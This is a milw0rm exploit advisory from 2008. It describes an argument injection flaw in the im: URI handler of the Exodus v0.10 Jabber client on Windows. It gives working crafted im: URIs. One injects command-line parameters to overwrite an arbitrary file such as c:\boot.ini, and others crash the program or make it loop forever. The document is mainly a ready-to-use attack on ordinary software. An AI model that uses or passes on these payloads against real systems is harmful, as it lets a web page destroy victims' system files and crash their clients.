@@ -1,0 +1,43 @@
+--------------------------------------------------------------------------------
+Exodus v0.10 uri handler arbitrary parameter injection
+by Nine:Situations:Group::strawdog
+tested against IE8b/xpsp3
+may not work against non-English systems because of an installation bug
+--------------------------------------------------------------------------------
+software site: http://code.google.com/p/exodus/
+description:
+Exodus is a free software instant messaging client developed by Peter
+Millard and written in Borland Delphi that can connect to Jabber servers
+and exchange messages with other Jabber users. Currently, binaries are
+only available for Microsoft Windows. Exodus was designed as the official
+successor of the Winjab client, as Winjab was a personal project that
+was becoming too difficult to maintain[..]
+--------------------------------------------------------------------------------
+
+reg key:
+HKEY_CLASSES_ROOT\im\shell\Open\command
+C:\Program Files\Exodus\Exodus.exe -u '%1'
+--------------------------------------------------------------------------------
+it's possible to inject arbitrary command line parameters, ex. this shows
+the argument list:
+im:///'%20-?
+
+this overwrites an arbitrary file:
+im:///'%20-l%20c:\boot.ini%20-v
+
+now boot.ini looks like this:
+[2008-11-17 13.50.41.437]  Trying to setup the Auto Away timer.
+[2008-11-17 13.50.41.453]  Using Win32 API for Autoaway checks!!
+--------------------------------------------------------------------------------
+todo:
+investigate this even:
+im:///'%20-c%20[A*300]
+
+this will cause an infinite loop trough multiple unhandled exceptions
+and this:
+im:///'%20-c%20file:///aaaa%20
+crash exodus.exe
+--------------------------------------------------------------------------------
+our site ---------------------------------------> http://retrogod.altervista.org
+
+# milw0rm.com [2008-11-17]
